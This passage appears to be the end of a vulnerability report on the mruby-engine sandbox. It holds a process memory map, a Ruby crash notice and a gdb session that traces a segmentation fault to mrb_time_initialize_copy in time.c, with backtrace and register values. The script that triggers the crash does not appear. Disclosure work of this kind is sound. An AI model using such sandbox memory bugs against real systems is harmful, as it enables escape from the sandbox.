7f511ae73000-7f511b073000 ---p 0004f000 08:03 948466                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so
7f511b073000-7f511b075000 r--p 0004f000 08:03 948466                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so
7f511b075000-7f511b077000 rw-p 00051000 08:03 948466                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so
7f511b077000-7f511b078000 rw-p 00000000 00:00 0 
7f511b078000-7f511b079000 r-xp 00000000 08:03 948518                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so
7f511b079000-7f511b279000 ---p 00001000 08:03 948518                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so
7f511b279000-7f511b27a000 r--p 00001000 08:03 948518                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so
7f511b27a000-7f511b27b000 rw-p 00002000 08:03 948518                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so
7f511b27b000-7f511b2aa000 r-xp 00000000 08:03 948449                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so
7f511b2aa000-7f511b4aa000 ---p 0002f000 08:03 948449                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so
7f511b4aa000-7f511b4ab000 r--p 0002f000 08:03 948449                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so
7f511b4ab000-7f511b4ac000 rw-p 00030000 08:03 948449                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so
7f511b4ac000-7f511b4ad000 rw-p 00000000 00:00 0 
7f511b4ad000-7f511b4b0000 r-xp 00000000 08:03 948497                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so
7f511b4b0000-7f511b6af000 ---p 00003000 08:03 948497                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so
7f511b6af000-7f511b6b0000 r--p 00002000 08:03 948497                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so
7f511b6b0000-7f511b6b1000 rw-p 00003000 08:03 948497                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so
7f511b6b1000-7f511b6c6000 r-xp 00000000 08:03 935844                     /usr/lib/libz.so.1.2.8
7f511b6c6000-7f511b8c5000 ---p 00015000 08:03 935844                     /usr/lib/libz.so.1.2.8
7f511b8c5000-7f511b8c6000 r--p 00014000 08:03 935844                     /usr/lib/libz.so.1.2.8
7f511b8c6000-7f511b8c7000 rw-p 00015000 08:03 935844                     /usr/lib/libz.so.1.2.8
7f511b8c7000-7f511b8d4000 r-xp 00000000 08:03 948478                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so
7f511b8d4000-7f511bad3000 ---p 0000d000 08:03 948478                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so
7f511bad3000-7f511bad4000 r--p 0000c000 08:03 948478                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so
7f511bad4000-7f511bad5000 rw-p 0000d000 08:03 948478                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so
7f511bad5000-7f511bad7000 r-xp 00000000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so
7f511bad7000-7f511bcd6000 ---p 00002000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so
7f511bcd6000-7f511bcd7000 r--p 00001000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so
7f511bcd7000-7f511bcd8000 rw-p 00002000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so
7f511bcd8000-7f511bd02000 r-xp 00000000 08:03 948453                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so
7f511bd02000-7f511bf01000 ---p 0002a000 08:03 948453                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so
7f511bf01000-7f511bf02000 r--p 00029000 08:03 948453                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so
7f511bf02000-7f511bf03000 rw-p 0002a000 08:03 948453                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so
7f511bf03000-7f511bf09000 r-xp 00000000 08:03 948456                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so
7f511bf09000-7f511c108000 ---p 00006000 08:03 948456                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so
7f511c108000-7f511c109000 r--p 00005000 08:03 948456                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so
7f511c109000-7f511c10a000 rw-p 00006000 08:03 948456                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so
7f511c10a000-7f511c10e000 r-xp 00000000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so
7f511c10e000-7f511c30d000 ---p 00004000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so
7f511c30d000-7f511c30e000 r--p 00003000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so
7f511c30e000-7f511c30f000 rw-p 00004000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so
7f511c30f000-7f511c315000 r-xp 00000000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so
7f511c315000-7f511c514000 ---p 00006000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so
7f511c514000-7f511c515000 r--p 00005000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so
7f511c515000-7f511c516000 rw-p 00006000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so
7f511c516000-7f511c51d000 r-xp 00000000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so
7f511c51d000-7f511c71c000 ---p 00007000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so
7f511c71c000-7f511c71d000 r--p 00006000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so
7f511c71d000-7f511c71e000 rw-p 00007000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so
7f511c71e000-7f511c720000 r-xp 00000000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so
7f511c720000-7f511c920000 ---p 00002000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so
7f511c920000-7f511c921000 r--p 00002000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so
7f511c921000-7f511c922000 rw-p 00003000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so
7f511c922000-7f511c924000 r-xp 00000000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so
7f511c924000-7f511cb23000 ---p 00002000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so
7f511cb23000-7f511cb24000 r--p 00001000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so
7f511cb24000-7f511cb25000 rw-p 00002000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so
7f511cb25000-7f511cc26000 rw-p 00000000 00:00 0 
7f511cc26000-7f511cd29000 r-xp 00000000 08:03 935421                     /usr/lib/libm-2.24.so
7f511cd29000-7f511cf28000 ---p 00103000 08:03 935421                     /usr/lib/libm-2.24.so
7f511cf28000-7f511cf29000 r--p 00102000 08:03 935421                     /usr/lib/libm-2.24.so
7f511cf29000-7f511cf2a000 rw-p 00103000 08:03 935421                     /usr/lib/libm-2.24.so
7f511cf2a000-7f511cf32000 r-xp 00000000 08:03 935412                     /usr/lib/libcrypt-2.24.so
7f511cf32000-7f511d132000 ---p 00008000 08:03 935412                     /usr/lib/libcrypt-2.24.so
7f511d132000-7f511d133000 r--p 00008000 08:03 935412                     /usr/lib/libcrypt-2.24.so
7f511d133000-7f511d134000 rw-p 00009000 08:03 935412                     /usr/lib/libcrypt-2.24.so
7f511d134000-7f511d162000 rw-p 00000000 00:00 0 
7f511d162000-7f511d164000 r-xp 00000000 08:03 935420                     /usr/lib/libdl-2.24.so
7f511d164000-7f511d364000 ---p 00002000 08:03 935420                     /usr/lib/libdl-2.24.so
7f511d364000-7f511d365000 r--p 00002000 08:03 935420                     /usr/lib/libdl-2.24.so
7f511d365000-7f511d366000 rw-p 00003000 08:03 935420                     /usr/lib/libdl-2.24.so
7f511d366000-7f511d3f8000 r-xp 00000000 08:03 935607                     /usr/lib/libgmp.so.10.3.1
7f511d3f8000-7f511d5f7000 ---p 00092000 08:03 935607                     /usr/lib/libgmp.so.10.3.1
7f511d5f7000-7f511d5f8000 r--p 00091000 08:03 935607                     /usr/lib/libgmp.so.10.3.1
7f511d5f8000-7f511d5f9000 rw-p 00092000 08:03 935607                     /usr/lib/libgmp.so.10.3.1
7f511d5f9000-7f511d611000 r-xp 00000000 08:03 934933                     /usr/lib/libpthread-2.24.so
7f511d611000-7f511d810000 ---p 00018000 08:03 934933                     /usr/lib/libpthread-2.24.so
7f511d810000-7f511d811000 r--p 00017000 08:03 934933                     /usr/lib/libpthread-2.24.so
7f511d811000-7f511d812000 rw-p 00018000 08:03 934933                     /usr/lib/libpthread-2.24.so
7f511d812000-7f511d816000 rw-p 00000000 00:00 0 
7f511d816000-7f511d9ab000 r-xp 00000000 08:03 934952                     /usr/lib/libc-2.24.so
7f511d9ab000-7f511dbaa000 ---p 00195000 08:03 934952                     /usr/lib/libc-2.24.so
7f511dbaa000-7f511dbae000 r--p 00194000 08:03 934952                     /usr/lib/libc-2.24.so
7f511dbae000-7f511dbb0000 rw-p 00198000 08:03 934952                     /usr/lib/libc-2.24.so
7f511dbb0000-7f511dbb4000 rw-p 00000000 00:00 0 
7f511dbb4000-7f511de28000 r-xp 00000000 08:03 936071                     /usr/lib/libruby.so.2.3.0
7f511de28000-7f511e027000 ---p 00274000 08:03 936071                     /usr/lib/libruby.so.2.3.0
7f511e027000-7f511e02d000 r--p 00273000 08:03 936071                     /usr/lib/libruby.so.2.3.0
7f511e02d000-7f511e030000 rw-p 00279000 08:03 936071                     /usr/lib/libruby.so.2.3.0
7f511e030000-7f511e041000 rw-p 00000000 00:00 0 
7f511e041000-7f511e064000 r-xp 00000000 08:03 934951                     /usr/lib/ld-2.24.so
7f511e0b5000-7f511e24d000 r--p 00000000 08:03 934978                     /usr/lib/locale/locale-archive
7f511e24d000-7f511e253000 rw-p 00000000 00:00 0 
7f511e25d000-7f511e25f000 r--s 00000000 08:03 948906                     /usr/bin/ruby
7f511e25f000-7f511e260000 ---p 00000000 00:00 0 
7f511e260000-7f511e263000 rw-p 00000000 00:00 0 
7f511e263000-7f511e264000 r--p 00022000 08:03 934951                     /usr/lib/ld-2.24.so
7f511e264000-7f511e265000 rw-p 00023000 08:03 934951                     /usr/lib/ld-2.24.so
7f511e265000-7f511e266000 rw-p 00000000 00:00 0 
7ffd41d4f000-7ffd4254e000 rw-p 00000000 00:00 0                          [stack]
7ffd425b8000-7ffd425ba000 r--p 00000000 00:00 0                          [vvar]
7ffd425ba000-7ffd425bc000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]


[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

[1]    13900 abort (core dumped)  bin/sandbox /tmp/test.mrb
```

```
$gdb attach 13803
GNU gdb (GDB) 7.12
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
attach: No such file or directory.
Attaching to process 13803
[New LWP 13804]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
0x00007f72ba6144b8 in pthread_cond_timedwait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0
(gdb) bt
#0  0x00007f72ba6144b8 in pthread_cond_timedwait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0
#1  0x00007f72bad5ccae in ?? () from /usr/lib/libruby.so.2.3
#2  0x00007f72bad5de93 in ?? () from /usr/lib/libruby.so.2.3
#3  0x00007f72bad62c96 in ?? () from /usr/lib/libruby.so.2.3
#4  0x00007f72baca5720 in ?? () from /usr/lib/libruby.so.2.3
#5  0x00007f72bad408b5 in ?? () from /usr/lib/libruby.so.2.3
#6  0x00007f72bad53093 in ?? () from /usr/lib/libruby.so.2.3
#7  0x00007f72bad540e3 in ?? () from /usr/lib/libruby.so.2.3
#8  0x00007f72bad48a58 in ?? () from /usr/lib/libruby.so.2.3
#9  0x00007f72bad4daef in ?? () from /usr/lib/libruby.so.2.3
#10 0x00007f72bac354dd in ?? () from /usr/lib/libruby.so.2.3
#11 0x00007f72bac36e2d in ruby_exec_node () from /usr/lib/libruby.so.2.3
#12 0x00007f72bac38f2e in ruby_run_node () from /usr/lib/libruby.so.2.3
#13 0x00000000004007cb in ?? ()
#14 0x00007f72ba844291 in __libc_start_main () from /usr/lib/libc.so.6
#15 0x00000000004007fa in _start ()
(gdb) c
Continuing.
[New Thread 0x7f72b57fe700 (LWP 13867)]

Thread 3 "ruby" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7f72b57fe700 (LWP 13867)]
0x00007f72b6cc85d3 in mrb_time_initialize_copy (mrb=0x7f72b57ff4e0, copy=...)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-time/src/time.c:533
533	  *(struct mrb_time *)DATA_PTR(copy) = *(struct mrb_time *)DATA_PTR(src);
(gdb) bt
#0  0x00007f72b6cc85d3 in mrb_time_initialize_copy (mrb=0x7f72b57ff4e0, copy=...)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-time/src/time.c:533
#1  0x00007f72b6c87dbf in mrb_vm_exec (mrb=mrb@entry=0x7f72b57ff4e0, proc=<optimized out>, proc@entry=0x7f72b5807580, pc=<optimized out>)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
#2  0x00007f72b6c8d607 in mrb_vm_run (mrb=0x7f72b57ff4e0, proc=0x7f72b5807580, self=..., stack_keep=stack_keep@entry=0)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
#3  0x00007f72b6c6e613 in mruby_engine_monitored_eval (data=0x7f72b57ff3e0) at ../../../../ext/mruby_engine/eval_monitored.c:68
#4  0x00007f72ba60e454 in start_thread () from /usr/lib/libpthread.so.0
#5  0x00007f72ba90c7df in clone () from /usr/lib/libc.so.6
(gdb) info registers
rax            0x7f72b58224a0	140130648204448
rbx            0x7f72b58074f0	140130648093936
rcx            0x0	0
rdx            0x0	0
rsi            0x7f72b6f37c10	140130672409616
rdi            0x55504410	1431323664
rbp            0x7f72b57ff4e0	0x7f72b57ff4e0
rsp            0x7f72b57fdab0	0x7f72b57fdab0
r8             0x7f72b58074c0	140130648093888
r9             0x1	1
r10            0x177	375
r11            0x7f72b6cbef60	140130669817696
r12            0x7f72b58074f0	140130648093936
r13            0x4d	77
r14            0x7f72b57ff4e0	140130648061152
r15            0x7f72b57fff60	140130648063840
rip            0x7f72b6cc85d3	0x7f72b6cc85d3 <mrb_time_initialize_copy+115>
eflags         0x10246	[ PF ZF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) quit
A debugging session is active.

	Inferior 1 [process 13803] will be detached.

Quit anyway? (y or n) y
Detaching from program: /usr/bin/ruby, process 13803
```

## Attachments
No attachments
